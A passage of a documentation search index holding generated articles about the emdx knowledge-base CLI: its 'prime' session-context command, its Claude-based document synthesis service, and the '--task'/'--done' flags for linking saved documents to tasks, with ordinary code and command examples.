</ul>"},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#test-coverage","title":"Test Coverage","text":"<p>Test coverage includes: - Parallel success (all tasks complete) - Synthesis mode (combining outputs) - All failures (exit code 1) - Partial failures (some tasks succeed, some fail) - Worktree isolation (creation and cleanup) - PR/branch summary output - Task hierarchy creation and status tracking</p> <p>The test suite uses mocked <code>UnifiedExecutor</code> and <code>subprocess.run</code> to avoid actual Claude API calls and git operations during testing.</p> <p>Generated from 23 source documents</p>"},{"location":"articles/emdx-prime-and-smart-context-features/","title":"emdx prime and Smart Context Features","text":""},{"location":"articles/emdx-prime-and-smart-context-features/#overview","title":"Overview","text":"<p><code>emdx prime</code> is the session initialization command that provides Claude Code agents with relevant work context at the start of a session. It answers the question \"what should I work on?\" by showing ready tasks, in-progress work, git state, and recent failures.</p> <p>The command has evolved through multiple phases, incorporating \"smart priming\" features that provide context-aware information to help agents understand project state, recent activity, and what needs attention.</p>"},{"location":"articles/emdx-prime-and-smart-context-features/#core-features","title":"Core Features","text":""},{"location":"articles/emdx-prime-and-smart-context-features/#basic-prime-output","title":"Basic Prime Output","text":"<p>The default <code>emdx prime</code> output includes:</p> <ul> <li>Project identification \u2014 Detected from git repository name</li> <li>Usage instructions \u2014 Common commands for save, search, view, tags, and tasks</li> <li>Active epics \u2014 Parent epics with progress indicators</li> <li>Ready tasks \u2014 Unblocked tasks available to work on</li> <li>In-progress tasks \u2014 Currently active work</li> <li>Cascade queue status \u2014 Background analysis pipeline state</li> <li>Git context \u2014 Current branch, recent commits, open PRs</li> <li>Key documents \u2014 Most-viewed documents by access count</li> <li>Stale documents \u2014 Important docs that haven't been viewed recently</li> <li>Recent failures \u2014 Failed delegate executions from the last 24 hours</li> </ul>"},{"location":"articles/emdx-prime-and-smart-context-features/#output-modes","title":"Output Modes","text":"<pre><code>emdx prime                    # Text output (default)\nemdx prime --format json      # JSON output\nemdx prime --verbose          # Include extra context (key docs, stale docs)\nemdx prime --quiet            # Minimal output (omit failures)\n</code></pre>"},{"location":"articles/emdx-prime-and-smart-context-features/#smart-priming-features","title":"Smart Priming Features","text":""},{"location":"articles/emdx-prime-and-smart-context-features/#git-context-_get_git_context","title":"Git Context (<code>_get_git_context()</code>)","text":"<p>Location: <code>emdx/commands/prime.py</code></p> <p>Captures current git state to provide situational awareness:</p> <ul> <li>Current branch \u2014 Via <code>git branch --show-current</code></li> <li>Recent commits \u2014 Last 3 commits via <code>git log --oneline -3</code></li> <li>Open PRs \u2014 Via <code>gh pr list --state=open --limit=5 --json number,title,headRefName</code></li> </ul> <p>Graceful degradation: - Handles git not installed (FileNotFoundError) - Handles git timeout (subprocess.TimeoutExpired) - Handles not a git repo (non-zero return code) - Continues without PR data if gh CLI not installed</p> <p>Implementation notes: - Uses <code>subprocess.run</code> with <code>capture_output=True</code> and timeout - Parses JSON output from gh CLI - Integrated into both text and JSON output modes</p>"},{"location":"articles/emdx-prime-and-smart-context-features/#key-documents-_get_key_docs","title":"Key Documents (<code>_get_key_docs()</code>)","text":"<p>Location: <code>emdx/commands/prime.py</code></p> <p>Shows most-viewed documents to surface important reference material:</p> <pre><code>SELECT id, title, access_count \nFROM documents \nWHERE deleted_at IS NULL AND access_count &gt; 0 \nORDER BY access_count DESC \nLIMIT ?\n</code></pre> <p>Display format: <code>#ID \"Title\" \u2014 N views</code></p> <p>Only shown in: <code>--verbose</code> mode</p>"},{"location":"articles/emdx-prime-and-smart-context-features/#recent-activity-and-staleness-detection","title":"Recent Activity and Staleness Detection","text":"<p>Recent activity uses the <code>last_accessed_at</code> column to show documents accessed in the last 7 days.</p> <p>Staleness detection is handled by the dedicated <code>stale.py</code> module with importance scoring: - Uses <code>StalenessLevel</code> enum (CRITICAL/WARNING/INFO) - Importance scoring considers tag weights (security=3, gameplan=2) - <code>get_top_stale_for_priming()</code> is the integration point - See <code>emdx stale list</code> for standalone command</p>"},{"location":"articles/emdx-prime-and-smart-context-features/#recent-failures","title":"Recent Failures","text":"<p>Location: <code>emdx/commands/prime.py</code> (lines 495-564)</p> <p>Shows failed delegate executions from the last 24 hours with retry commands.</p> <p>Query logic:</p> <pre><code>SELECT * FROM executions\nWHERE status = 'failed'\n  AND completed_at &gt; datetime('now', '-24 hours')\nORDER BY completed_at DESC\nLIMIT 5\n</code></pre> <p>Error snippets are extracted from log files using <code>_extract_error_snippet()</code>: - Reads the last N lines from <code>~/.config/emdx/logs/&lt;exec_id&gt;.log</code> - Returns None for missing/empty files - Uses <code>Path.expanduser()</code> for tilde expansion</p> <p>Text output format:</p> <pre><code>RECENT FAILURES (2):\n\n  #101  Auth module crash (exit 1)\n         Error: connection refused\n         Retrying...\n         Retry: emdx delegate --retry 101\n  #102  Database timeout (exit 127)\n         Retry: emdx delegate --retry 102\n</code></pre> <p>JSON output format:</p> <pre><code>{\n  \"recent_failures\": [\n    {\n      \"id\": 101,\n      \"title\": \"Auth module crash\",\n      \"completed_at\": \"2024-01-15T10:00:00\",\n      \"exit_code\": 1,\n      \"task_id\": 42,\n      \"error_snippet\": \"Error: connection refused\\nRetrying...\",\n      \"retry_command\": \"emdx delegate --retry 101\"\n    }\n  ]\n}\n</code></pre> <p>Constants: - <code>FAILURE_LOOKBACK_HOURS = 24</code> \u2014 How far back to search - <code>MAX_RECENT_FAILURES = 5</code> \u2014 Maximum to display - <code>ERROR_SNIPPET_LINES = 5</code> \u2014 Lines to extract from logs</p> <p>Respects <code>--quiet</code> flag \u2014 Recent failures hidden in quiet mode.</p>"},{"location":"articles/emdx-prime-and-smart-context-features/#enhanced-ask-features","title":"Enhanced Ask Features","text":"<p>The <code>emdx ai ask</code> and <code>emdx ai context</code> commands were enhanced with filtering and enhanced output features (PR #453 / FEAT-7).</p>"},{"location":"articles/emdx-prime-and-smart-context-features/#tag-and-recent-filters-_add_filters","title":"Tag and Recent Filters (<code>_add_filters()</code>)","text":"<p>Location: <code>emdx/services/ask_service.py</code></p> <p>CLI usage:</p> <pre><code># Filter by tags\nemdx ai ask \"What are our security patterns?\" --tags \"security,active\"\n\n# Filter by recency\nemdx ai ask \"What changed recently?\" --recent 7\n\n# Combined filters\nemdx ai ask \"What's the auth strategy?\" --tags \"gameplan\" --recent 30\n\n# Context retrieval with filters (for piping to Claude CLI)\nemdx ai context \"security best practices\" --tags \"security\" | claude\n</code></pre> <p>Implementation: - Text aliases auto-expand to emojis via <code>normalize_tag_to_emoji()</code> - Filters applied to both keyword and semantic retrieval paths - <code>_get_filtered_doc_ids()</code> helper joins <code>document_tags</code> and <code>tags</code> tables - Recent filter: <code>created_at &gt; datetime('now', '-N days')</code></p>"},{"location":"articles/emdx-prime-and-smart-context-features/#enhanced-answer-output","title":"Enhanced Answer Output","text":"<p>Location: <code>emdx/services/ask_service.py</code></p> <p>The <code>Answer</code> dataclass was enhanced with:</p> <ol> <li>Source titles \u2014 <code>source_titles: list[tuple[int, str]]</code></li> <li>Display format: <code>#ID \"Title\"</code> instead of bare <code>#ID</code></li> <li> <p>Populated during retrieval</p> </li> <li> <p>Confidence indicator \u2014 <code>confidence: str</code></p> </li> <li><code>\"high\"</code> for 3+ sources</li> <li><code>\"medium\"</code> for 1-2 sources</li> <li><code>\"low\"</code> for 0 sources</li> <li> <p>Display with color in Rich output (green/yellow/red panel borders)</p> </li> <li> <p>Context budget \u2014 ~3000 tokens cap</p> </li> <li>Constant: <code>CONTEXT_BUDGET_CHARS = 12000</code></li> <li>Tracks total chars across all context docs</li> <li>Per-doc cap of 3000 chars or remaining budget</li> <li>Breaks when budget exceeded</li> </ol> <p>Panel display format:</p> <pre><code>\u256d\u2500 Answer [HIGH confidence] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e\n\u2502 The auth module uses JWT tokens with RSA signing.     \u2502\n\u2502                                                        \u2502\n\u2502 Sources:                                               \u2502\n\u2502 #42 \"Auth Module\", #43 \"Security Guide\"              \u2502\n\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f\n</code></pre>"},{"location":"articles/emdx-prime-and-smart-context-features/#architecture-design-decisions","title":"Architecture &amp; Design Decisions","text":""},{"location":"articles/emdx-prime-and-smart-context-features/#why-tasks-table-for-failures-not-executions","title":"Why Tasks Table for Failures (Not Executions)","text":"<p>Initial proposal (Document #6542): Use the <code>tasks</code> table with <code>get_failed_tasks()</code> because: - Tasks have an <code>error</code> field that stores error messages - <code>status.py</code> already implements <code>_show_failed_tasks()</code> using this function - Tasks have <code>prompt</code> field needed for retry commands - Executions don't have error messages stored; errors live in log files</p> <p>Final implementation (Document #6560): Uses the <code>executions</code> table instead because: - More accurate source of truth for delegate execution failures - <code>completed_at</code> timestamp shows when the failure occurred - <code>exit_code</code> provides diagnostic information - Error snippets extracted from log files (last N lines) - Better handles edge cases (missing prompts, null exit codes)</p>"},{"location":"articles/emdx-prime-and-smart-context-features/#filter-reusability","title":"Filter Reusability","text":"<p>The <code>_add_filters()</code> helper in <code>ask_service.py</code> was extracted to avoid duplication between <code>_retrieve_keyword()</code> and <code>_retrieve_semantic()</code>. This followed code review feedback on PR #453.</p> <p>Before: Filter logic duplicated in both methods After: Single module-level helper handles all filter combinations</p>"},{"location":"articles/emdx-prime-and-smart-context-features/#column-name-consistency","title":"Column Name Consistency","text":"<p>Early implementation of smart priming had a column name mismatch (<code>accessed_at</code> vs <code>last_accessed_at</code>). The current codebase consistently uses <code>last_accessed_at</code> for document access tracking.</p>"},{"location":"articles/emdx-prime-and-smart-context-features/#implementation-details","title":"Implementation Details","text":""},{"location":"articles/emdx-prime-and-smart-context-features/#subprocess-handling-for-git-commands","title":"Subprocess Handling for Git Commands","text":"<p>Git context uses <code>subprocess.run</code> with proper error handling:</p> <pre><code>def _get_git_context() -&gt; dict[str, Any]:\n    try:\n        result = subprocess.run(\n            [\"git\", \"branch\", \"--show-current\"],\n            capture_output=True,\n            text=True,\n            timeout=5,\n            check=True\n        )\n        branch = result.stdout.strip()\n    except (FileNotFoundError, subprocess.TimeoutExpired, subprocess.CalledProcessError):\n        return {\"error\": \"git not available\"}\n</code></pre>"},{"location":"articles/emdx-prime-and-smart-context-features/#hook-integration","title":"Hook Integration","text":"<p>Claude Code hooks in <code>.claude/settings.json</code> handle session lifecycle:</p> Hook Event What it does <code>prime.sh</code> SessionStart Injects KB context (ready tasks, in-progress) <code>save-output.sh</code> Stop Auto-saves output to KB (delegate sessions only) <code>session-end.sh</code> SessionEnd Updates task status (delegate sessions only) <p>Env vars recognized by hooks:</p> Variable Set by Used by Purpose <code>EMDX_AUTO_SAVE</code> delegate save-output.sh Enable auto-save (\"1\" to activate) <code>EMDX_DOC_ID</code> delegate prime.sh Include document as context <code>EMDX_TASK_ID</code> delegate prime.sh, session-end.sh Track task lifecycle"},{"location":"articles/emdx-prime-and-smart-context-features/#token-efficiency","title":"Token Efficiency","text":"<p>Smart priming targets &lt;500 tokens for compact output: - Truncates titles to 40 characters - Truncates error snippets to 60 characters (first line only) - Limits to 5 items per section (ready tasks, failures, key docs) - Uses compact formatting (no extra whitespace)</p>"},{"location":"articles/emdx-prime-and-smart-context-features/#test-coverage","title":"Test Coverage","text":"<p>Location: <code>tests/test_commands_prime.py</code> and <code>tests/test_ask.py</code></p> <p>Git context tests: - Mock subprocess calls for branch/commits/PRs - Test graceful degradation (git failure, gh CLI missing, timeout) - Test JSON output validity</p> <p>Recent failures tests: - Test error snippet extraction (missing file, empty file, whitespace-only, tilde expansion) - Test quiet mode (failures hidden) - Test long title truncation - Test null exit code handling</p> <p>Ask feature tests: - Tag filtering query structure validation - Recent days filtering (1, 7, 30, 90, 365 days) - Confidence level calculation (high/medium/low) - Machine output format validation - Filter application in keyword and semantic retrieval</p>"},{"location":"articles/emdx-prime-and-smart-context-features/#related-topics","title":"Related Topics","text":""},{"location":"articles/emdx-prime-and-smart-context-features/#delegate-workflow-integration","title":"Delegate Workflow Integration","text":"<p>Prime output is consumed by Claude Code agents at session start via the <code>prime.sh</code> hook. For delegate sessions: - <code>EMDX_DOC_ID</code> injects specific document context - <code>EMDX_TASK_ID</code> tracks task lifecycle - Recent failures provide retry commands for failed attempts</p>"},{"location":"articles/emdx-prime-and-smart-context-features/#knowledge-base-organization","title":"Knowledge Base Organization","text":"<p>Prime leverages multiple KB organization mechanisms: - Tasks \u2014 Epics, categories, dependencies - Tags \u2014 Plain text classification (gameplan, active, security) - Access tracking \u2014 <code>last_accessed_at</code>, <code>access_count</code> for staleness/importance</p>"},{"location":"articles/emdx-prime-and-smart-context-features/#cascade-queue","title":"Cascade Queue","text":"<p>The cascade queue runs background analysis to auto-link documents and extract entities. Prime shows queue status to indicate when analysis is pending vs complete.</p> <p>Generated from 16 source documents</p>"},{"location":"articles/emdx-services-and-synthesisservicepy/","title":"emdx: services and synthesis_service.py","text":""},{"location":"articles/emdx-services-and-synthesisservicepy/#overview","title":"Overview","text":"<p><code>emdx/services/synthesis_service.py</code> provides shared AI-powered document synthesis capabilities for EMDX commands. It uses Claude's Opus model to intelligently merge multiple related documents into cohesive, well-organized articles while removing redundancy and preserving technical accuracy.</p> <p>The service powers two major KB management features: - <code>emdx compact</code> \u2014 Reduces KB redundancy by synthesizing duplicate/overlapping documents - <code>emdx distill</code> \u2014 Surfaces and synthesizes KB content for sharing with different audiences</p>"},{"location":"articles/emdx-services-and-synthesisservicepy/#key-concepts","title":"Key Concepts","text":""},{"location":"articles/emdx-services-and-synthesisservicepy/#synthesisservice-class","title":"SynthesisService Class","text":"<p>The core service class manages AI-powered document synthesis with these responsibilities:</p> <pre><code>class SynthesisService:\n    \"\"\"Service for AI-powered document synthesis.\"\"\"\n\n    def synthesize_documents(\n        self,\n        doc_ids: List[int],\n        purpose: str = \"synthesis\"\n    ) -&gt; SynthesisResult:\n        \"\"\"Synthesize multiple documents into one coherent document.\"\"\"\n\n    def estimate_cost(\n        self,\n        doc_ids: List[int]\n    ) -&gt; Tuple[int, float]:\n        \"\"\"Estimate tokens and cost before synthesis.\"\"\"\n</code></pre> <p>Design principles: - Always uses Claude Opus for quality-critical synthesis - Lazy-loads Anthropic client with import guards (optional <code>[ai]</code> dependency) - Truncates long documents to ~6000 characters to manage context window - Returns structured <code>SynthesisResult</code> with content, metadata, and usage statistics</p>"},{"location":"articles/emdx-services-and-synthesisservicepy/#synthesisresult-dataclass","title":"SynthesisResult Dataclass","text":"<p>Tracks synthesis output and metadata:</p> <pre><code>@dataclass\nclass SynthesisResult:\n    success: bool\n    new_doc_id: int | None\n    source_doc_ids: List[int]\n    title: str\n    content: str  # Synthesized markdown content\n    error: str | None = None\n    tokens_used: int = 0\n    cost_usd: float = 0.0\n    model: str = \"claude-opus-4-5-20250929\"\n</code></pre>"},{"location":"articles/emdx-services-and-synthesisservicepy/#document-archival-superseded-tag-system","title":"Document Archival: superseded Tag System","text":"<p>When documents are synthesized via <code>emdx compact</code>, original source documents are archived, not deleted:</p> <ol> <li>Tagging: Sources receive <code>superseded</code> tag + <code>superseded-by:ID</code> tag linking to new doc</li> <li>Reversibility: Users can view/restore archived docs anytime</li> <li>Traceability: Full provenance chain via tag metadata</li> </ol> <p>Example:</p> <pre><code># Compact docs 42, 43, 44 \u2192 creates doc 100\nemdx compact 42 43 44\n\n# Original docs now tagged:\n# #42: superseded, superseded-by:100\n# #43: superseded, superseded-by:100  \n# #44: superseded, superseded-by:100\n</code></pre> <p>This pattern enables KB cleanup while maintaining full audit trail.</p>"},{"location":"articles/emdx-services-and-synthesisservicepy/#architecture-design-decisions","title":"Architecture &amp; Design Decisions","text":""},{"location":"articles/emdx-services-and-synthesisservicepy/#shared-service-pattern","title":"Shared Service Pattern","text":"<p><code>SynthesisService</code> is designed as reusable infrastructure shared across multiple commands:</p> Command Use Case Key Difference <code>compact</code> Reduce redundancy Merges similar/duplicate documents <code>distill</code> Share knowledge Synthesizes for specific audiences (me/docs/team) <p>Both commands use the same synthesis engine but with different: - Prompts \u2014 <code>compact</code> focuses on deduplication; <code>distill</code> on audience-appropriate formatting - Selection \u2014 <code>compact</code> uses TF-IDF clustering; <code>distill</code> uses search/tags - Output \u2014 <code>compact</code> archives originals; <code>distill</code> creates standalone briefs</p>"},{"location":"articles/emdx-services-and-synthesisservicepy/#cost-management-strategy","title":"Cost Management Strategy","text":"<p>AI synthesis is quality-critical but expensive, so the service implements multiple cost controls:</p> <ol> <li>Always Opus \u2014 Uses highest-quality model (<code>claude-opus-4-5-20250929</code>) because synthesis errors are costly</li> <li>Token estimation \u2014 <code>estimate_cost()</code> calculates approximate cost before API call</li> <li>Transparent billing \u2014 Returns actual token usage and USD cost in <code>SynthesisResult</code></li> <li>Free discovery \u2014 <code>emdx compact --dry-run</code> uses zero API calls (local TF-IDF only)</li> </ol> <p>Pricing (approximate): $15/$75 per million tokens (input/output)</p>"},{"location":"articles/emdx-services-and-synthesisservicepy/#prompt-engineering","title":"Prompt Engineering","text":"<p>The synthesis prompt instructs Claude to:</p> <ol> <li>Identify core topic/theme across all documents</li> <li>Extract and preserve best insights from each</li> <li>Remove redundant information (keep best version)</li> <li>Organize content logically</li> <li>Use clear, consistent writing style</li> </ol> <p>Critical directive: \"Do NOT add meta-commentary like 'This document synthesizes...' \u2014 just output the content.\"</p> <p>This produces clean, production-ready markdown suitable for direct use.</p>"},{"location":"articles/emdx-services-and-synthesisservicepy/#import-guards-for-optional-dependencies","title":"Import Guards for Optional Dependencies","text":"<p>Since <code>anthropic</code> SDK is an optional dependency (part of <code>[ai]</code> extra), the service uses defensive imports:</p> <pre><code>try:\n    import anthropic\n    HAS_ANTHROPIC = True\nexcept ImportError:\n    HAS_ANTHROPIC = False\n\ndef _require_anthropic() -&gt; None:\n    if not HAS_ANTHROPIC:\n        raise ImportError(\n            \"anthropic is required for synthesis features. \"\n            \"Install it with: pip install 'emdx[ai]'\"\n        )\n</code></pre> <p>This keeps core EMDX lightweight while providing helpful errors when AI features are used without dependencies.</p>"},{"location":"articles/emdx-services-and-synthesisservicepy/#implementation-details","title":"Implementation Details","text":""},{"location":"articles/emdx-services-and-synthesisservicepy/#document-loading-and-preparation","title":"Document Loading and Preparation","text":"<pre><code>def _fetch_documents(self, doc_ids: List[int]) -&gt; List[DocumentContent]:\n    \"\"\"Load documents by ID with their tags.\"\"\"\n    docs = []\n    for doc_id in doc_ids:\n        doc = get_document(doc_id)\n        if doc:\n            tags = get_document_tags(doc_id)\n            docs.append(DocumentContent(\n                doc_id=doc_id,\n                title=doc.get(\"title\", f\"Document #{doc_id}\"),\n                content=doc.get(\"content\", \"\")[:6000],  # Truncate\n                tags=tags\n            ))\n    return docs\n</code></pre> <p>Key details: - Fetches full document content from DB - Retrieves associated tags for context - Truncates content to 6000 chars to manage context window - Does not update access tracking (unlike <code>get_document()</code> normally)</p>"},{"location":"articles/emdx-services-and-synthesisservicepy/#title-extraction","title":"Title Extraction","text":"<p>The service can extract titles from synthesized content or generate defaults:</p> <pre><code>def _extract_title(self, synthesized_content: str) -&gt; str:\n    \"\"\"Extract title from first H1 heading or generate default.\"\"\"\n    # Look for markdown H1: # Title\n    # Falls back to \"Synthesized Document\" if not found\n</code></pre>"},{"location":"articles/emdx-services-and-synthesisservicepy/#tag-management","title":"Tag Management","text":"<p>When archiving source documents:</p> <pre><code>def archive_originals(\n    self,\n    source_doc_ids: List[int],\n    new_doc_id: int\n) -&gt; int:\n    \"\"\"Archive source documents after synthesis.\"\"\"\n    for doc_id in source_doc_ids:\n        add_tags_to_document(doc_id, [\n            'superseded',\n            f'superseded-by:{new_doc_id}'\n        ])\n</code></pre> <p>Tag filtering rules: - Status tags (<code>active</code>, <code>done</code>, <code>blocked</code>) are NOT transferred to synthesized doc - <code>superseded</code> tag is added to originals - <code>synthesized</code> tag is added to new doc - <code>superseded-by:ID</code> creates traceable link</p>"},{"location":"articles/emdx-services-and-synthesisservicepy/#audience-aware-synthesis-distill-command","title":"Audience-Aware Synthesis (distill command)","text":"<p>The <code>distill</code> command extends synthesis with audience-specific prompts:</p> <pre><code>class Audience(Enum):\n    ME = \"me\"           # Dense, technical, includes doc IDs\n    DOCS = \"docs\"       # Formal, standalone documentation\n    COWORKERS = \"coworkers\"  # Team briefing format\n</code></pre> <p>Each audience mode uses different system prompts: - ME: Bullet points, informal tone, includes source doc IDs for drill-back - DOCS: Technical documentation with clear structure and examples - COWORKERS: Executive summary and action items</p>"},{"location":"articles/emdx-services-and-synthesisservicepy/#related-topics","title":"Related Topics","text":""},{"location":"articles/emdx-services-and-synthesisservicepy/#emdx-compact-command","title":"emdx compact Command","text":"<p>Uses <code>SynthesisService</code> to reduce KB redundancy through intelligent document merging.</p> <p>Architecture:</p> <pre><code>Discovery Layer (free, local TF-IDF) \n    \u2192 Synthesis Layer (Claude API)\n    \u2192 Archive Layer (superseded tags)\n</code></pre> <p>Usage:</p> <pre><code>emdx compact --dry-run              # Free discovery only\nemdx compact 42 43 44               # Synthesize specific docs\nemdx compact --auto                 # Process all clusters\nemdx compact --topic \"auth\" --auto  # Topic-filtered synthesis\n</code></pre>"},{"location":"articles/emdx-services-and-synthesisservicepy/#emdx-distill-command","title":"emdx distill Command","text":"<p>Uses <code>SynthesisService</code> to create audience-appropriate briefs from KB content.</p> <p>Usage:</p> <pre><code>emdx distill 'authentication'              # Topic search\nemdx distill --tags 'security,active'      # Tag filtering\nemdx distill --for docs 'API design'       # Docs audience\nemdx distill --for coworkers 'status'      # Team briefing\nemdx distill 'auth' --save --title \"Brief\" # Save to KB\n</code></pre>"},{"location":"articles/emdx-services-and-synthesisservicepy/#superseded-byid-tag-pattern","title":"superseded-by:id Tag Pattern","text":"<p>The <code>superseded-by:ID</code> tag pattern creates a traceable provenance chain:</p> <ol> <li>When doc 100 synthesizes docs 42, 43, 44</li> <li>Each source gets tagged: <code>superseded</code>, <code>superseded-by:100</code></li> <li>Users can find synthesis source via tag search: <code>emdx find --tags superseded-by:100</code></li> <li>Reversible: remove tags to \"unarchive\" originals</li> </ol> <p>This pattern balances KB cleanup with full audit trails.</p>"},{"location":"articles/emdx-services-and-synthesisservicepy/#quality-assurance","title":"Quality Assurance","text":"<p>All implementations passed: - mypy: Strict type checking, zero errors - ruff: Line length 100, all rule sets enabled - pytest: 22+ tests for compact, 15+ tests for distill - Integration: Full test suite 1182+ passing tests</p>"},{"location":"articles/emdx-services-and-synthesisservicepy/#related-prs","title":"Related PRs","text":"<ul> <li>#618, #620: emdx distill implementation</li> <li>#619, #621: emdx compact implementation with enhancements</li> </ul> <p>Generated from 12 source documents</p>"},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/","title":"EMDX Task and Document Linking: <code>--task</code> and <code>--done</code> Flags","text":""},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#overview","title":"Overview","text":"<p>The <code>emdx save</code> command supports linking saved documents to tasks via the <code>--task</code> flag and optionally marking those tasks as done via the <code>--done</code> flag. This feature was introduced in PR #649 to create stronger associations between task work and the documents that result from it.</p>"},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#key-concepts","title":"Key Concepts","text":""},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#task-document-linking","title":"Task-Document Linking","text":"<p>Documents can be linked to tasks in two ways: - Input documents (<code>input_doc_id</code>): The document that describes what needs to be done - Output documents (<code>output_doc_id</code>): The document that captures the result of doing the task</p> <p>The <code>--task</code> flag sets the <code>output_doc_id</code> field on a task, establishing a link from the task to the saved document.</p>"},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#task-completion-workflow","title":"Task Completion Workflow","text":"<p>The <code>--done</code> flag combines two operations in a single command: 1. Links the document to a task (via <code>output_doc_id</code>) 2. Marks the task status as <code>done</code></p> <p>This provides a convenient workflow for completing a task and saving its output simultaneously.</p>"},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#command-syntax","title":"Command Syntax","text":"<pre><code># Link a saved document to a task\necho \"Research findings\" | emdx save --title \"Analysis\" --task 42\n\n# Link and mark task as done\necho \"Implementation complete\" | emdx save --title \"Code\" --task 42 --done\n\n# Save file and link to task\nemdx save report.md --task 42\n</code></pre>"},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#implementation-details","title":"Implementation Details","text":""},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#validation-rules","title":"Validation Rules","text":"<ol> <li><code>--done</code> requires <code>--task</code>: The <code>--done</code> flag cannot be used without specifying a task ID via <code>--task</code></li> <li>Task existence check: Before saving the document, the command validates that the specified task ID exists</li> <li>Upfront validation: Task validation happens before document creation \u2014 if the task doesn't exist, no document is saved</li> </ol>"},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#execution-flow","title":"Execution Flow","text":"<p>From <code>emdx/commands/core.py</code>:</p> <pre><code># Validate --done requires --task\nif done and task is None:\n    console.print(\"[red]Error: --done requires --task[/red]\")\n    raise typer.Exit(1) from None\n\n# Validate task exists (before saving document)\nif task is not None:\n    from ..models.tasks import get_task\n    if not get_task(task):\n        console.print(f\"[red]Error: Task {task} not found[/red]\")\n        raise typer.Exit(1) from None\n\n# ... save document ...\n\n# Link document to task\nif task is not None:\n    from ..models.tasks import update_task\n    update_kwargs: dict[str, Any] = {\"output_doc_id\": doc_id}\n    if done:\n        update_kwargs[\"status\"] = \"done\"\n    update_task(task, **update_kwargs)\n</code></pre>"},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#display-in-task-views","title":"Display in Task Views","text":"<p>The <code>emdx task view</code> command displays linked documents with their titles:</p> <pre><code>Input Document:   #123: Project Requirements\nOutput Document:  #124: Implementation Plan (this document)\n</code></pre> <p>Deleted documents are shown as \"(deleted)\":</p> <pre><code>Input Document:   #123 (deleted)\n</code></pre>"},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#testing","title":"Testing","text":"<p>Comprehensive test coverage was added in PR #655 with 9 test cases covering:</p>"},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#happy-paths","title":"Happy Paths","text":"<ul> <li><code>--task</code> flag links document to task via <code>output_doc_id</code></li> <li><code>--task</code> flag works correctly with stdin input</li> <li><code>--done</code> flag marks linked task as done</li> <li><code>--done</code> flag shows \"(done)\" status in CLI output</li> </ul>"},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#error-conditions","title":"Error Conditions","text":"<ul> <li><code>--done</code> without <code>--task</code> produces clear error message</li> <li><code>--task</code> with non-existent task ID shows error</li> <li><code>--task</code> and <code>--done</code> with non-existent task ID shows error</li> <li>Task validation happens upfront (no document created if task doesn't exist)</li> </ul> <p>All tests use proper mocking patterns and verify both CLI output and database state.</p>"},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#related-pull-requests","title":"Related Pull Requests","text":"<ul> <li>PR #649: Initial implementation of <code>--task</code> and <code>--done</code> flags</li> <li>PR #655: Added comprehensive test coverage (9 tests)</li> <li>PR #650: Enhanced <code>emdx task view</code> to show linked documents with titles</li> </ul>"},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#usage-patterns","title":"Usage Patterns","text":""},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#delegate-workflow","title":"Delegate Workflow","text":"<p>The <code>--task</code> and <code>--done</code> flags integrate well with the delegate system. From hooks (documented in CLAUDE.md):</p> <pre><code># save-output.sh hook (auto-saves delegate output)\nEMDX_AUTO_SAVE=1\nEMDX_TASK_ID=42\nEMDX_TITLE=\"Research Results\"\n\n# session-end.sh hook (updates task status after completion)\nemdx task done $EMDX_TASK_ID\n</code></pre> <p>For manual delegate invocations:</p> <pre><code># Run delegate on a task and link output\nemdx delegate \"research authentication patterns\" --task 42 --done\n</code></pre>"},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#manual-workflows","title":"Manual Workflows","text":"<pre><code># Research task workflow\nemdx task add \"Research SSO options\" --epic 100 --cat FEAT\n# =&gt; Created task #42\n\n# Do the research...\n\n# Save findings and mark task done\nemdx save sso-research.md --task 42 --done\n# =&gt; \u2705 Saved as #123 (linked to task #42, done)\n</code></pre>"},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#design-decisions","title":"Design Decisions","text":""},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#why-output-not-input","title":"Why Output, Not Input?","text":"<p>The <code>--task</code> flag sets the <code>output_doc_id</code> field, not <code>input_doc_id</code>. This reflects the common pattern where: - Input documents are specified when creating the task (<code>emdx task add --doc 100</code>) - Output documents are created as a result of doing the task</p>"},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#why-lazy-imports","title":"Why Lazy Imports?","text":"<p>The implementation uses lazy imports for task-related functions:</p> <pre><code>if task is not None:\n    from ..models.tasks import get_task, update_task\n</code></pre> <p>This keeps the <code>emdx save</code> command fast when the <code>--task</code> flag isn't used, avoiding unnecessary module loading.</p>"},{"location":"articles/emdx-task-and-document-linking-task-and-done-flags/#validation-before-save","title":"Validation Before Save","text":"<p>Task validation happens before document creation to avoid orphaned documents. If a user mistypes a task ID, no document is created:</p> <pre><code>$ echo \"work\" | emdx save --title \"Results\" --task 999\nError: Task 999 not found\n# No document was created\n</code></pre> <p>This \"fail fast\" approach prevents database pollution with unlinked documents.</p> <p>Generated from 12 source documents</p>"},{"location":"articles/inputtokens-outputtokens-tokensused/","title":"input_tokens / 